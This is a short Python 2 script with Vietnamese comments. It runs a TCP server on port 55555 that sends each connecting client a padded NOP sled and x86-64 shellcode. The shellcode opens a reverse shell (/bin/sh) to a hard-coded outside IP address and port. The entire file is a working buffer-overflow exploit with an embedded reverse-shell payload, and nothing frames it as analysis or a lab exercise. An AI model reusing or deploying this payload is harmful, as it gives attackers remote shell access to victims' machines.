import socket

s = socket.socket()         # Tao mot doi tuong socket
host = "0.0.0.0"            # Lay ten thiet bi local
port = 55555                # Danh rieng mot port cho dich vu cua ban.
s.bind((host, port))        # Ket noi toi port
shell = "\x00"*0x58         # padding
shell += "\x90"*100+"\x31\xF6\xF7\xE6\xFF\xC6\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x50\x5F\x52\x52\xC7\x44\x24\x04\x67\x5a\xe2\x9d\x66\xC7\x44\x24\x02\x30\x39\x66\xC7\x04\x24\x02\x00\x54\x5E\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x6A\x00\x5E\x6A\x21\x58\x0F\x05\x31\xF6\x56\x5A\x56\x48\xBF\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x57\x54\x5F\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
s.listen(5)                 # Doi 5 s de ket noi voi client.
print "Listenning in %s:%s" %(host, port)
while True:
   print "\n"
   c, addr = s.accept()     # Thiet lap ket noi voi client.
   print "Connected from", addr
   print "\n"
   c.send(shell)
   print c.recv(0xffff)
   c.close()                # Ngat ket noi
